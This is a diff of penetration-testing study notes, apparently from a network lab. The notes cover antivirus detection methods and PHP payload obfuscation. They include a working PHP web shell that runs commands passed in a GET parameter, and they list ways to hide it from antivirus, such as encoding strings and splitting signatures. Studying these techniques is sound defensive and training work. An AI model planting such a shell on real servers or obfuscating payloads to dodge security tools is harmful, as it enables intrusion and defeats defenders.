@@ -2,6 +2,8 @@
 
 <figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
+### Detection methods:
+
 When it comes to AV evasion we have two primary types available:
 
 * On-Disk evasion
@@ -27,3 +29,30 @@ Where **static** virus malware detection methods look at the file itself, **dyna
 The AV lookes at pre-defined rules about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn't be?), the AV can see how the program intends to act
 
 The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware
+
+### PHP Payload Obfuscation
+
+let's consider the following payload:
+
+```php
+<?php
+    $cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+
+Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen.
+
+There are a variety of measures we could take here to try to bypass AV, including but not limited to:
+
+* Switching parts of the exploit around so that they're in an unusual order
+* Encoding all of the strings so that they're not recognisable
+* Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)
+
+{% embed url="https://www.gaijin.at/en/tools/php-obfuscator" %}
+to make your php unreadable and hard to reverse:
+{% endembed %}
+
